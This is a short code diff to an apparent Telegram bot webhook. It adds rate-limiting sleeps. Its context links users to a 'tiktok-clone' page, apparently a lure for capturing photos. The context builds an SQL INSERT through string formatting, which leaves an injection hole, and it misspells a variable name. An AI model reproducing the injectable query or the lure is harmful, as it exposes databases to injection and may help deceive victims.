@@ -84,6 +84,7 @@ async def webhook(
                     bot = Bot(token)
                     try:
                         await send_telegram_photo(user_id, photo, redirect_url, bot)
+                        await asyncio.sleep(2)
                     except:
                         pass
         else:
@@ -107,6 +108,7 @@ async def webhook(
                         message = await send_telegram_message(user_id=user_id, text=f"🙎‍♂️Вам пришло новое фото!\nСсылка: https://rusfai-tiktok-clone2-c56e.twc1.net/tt?id={user_id}&redirect={redirect_url}", reply_markup=keyboard, bot=bot)
                         token_list.append(token)
                         message_list.append(int(message.message_id))
+                        await asyncio.sleep(2)
                     except:
                         pass
             mycursor.execute("INSERT INTO kwork22_photo (url, photo_time, user_id, message_id, token)  VALUES ('{}', '{}', '{}', '{}', '{}')".format(photo_path, int(time.time()), int(user_id), str(message_list), str(token_kist) ))
